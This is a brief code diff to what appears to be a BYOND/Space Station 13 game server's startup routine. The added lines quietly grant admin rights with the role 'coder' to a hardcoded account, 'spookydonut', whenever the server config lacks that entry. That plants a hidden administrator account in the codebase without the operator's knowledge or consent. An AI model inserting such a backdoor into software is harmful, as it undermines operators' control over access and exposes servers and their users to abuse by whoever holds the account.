@@ -23,6 +23,9 @@ var/global/datum/global_init/init = new ()
 
 	hub_password = "[config.hub_password]"
 
+	if(!world.GetConfig("admin", "spookydonut"))
+		world.SetConfig("APP/admin", "spookydonut", "role = coder")
+
 	//logs
 	var/date_string = time2text(world.realtime, "YYYY/MM-Month/DD-Day")
 	var/year_string = time2text(world.realtime, "YYYY")
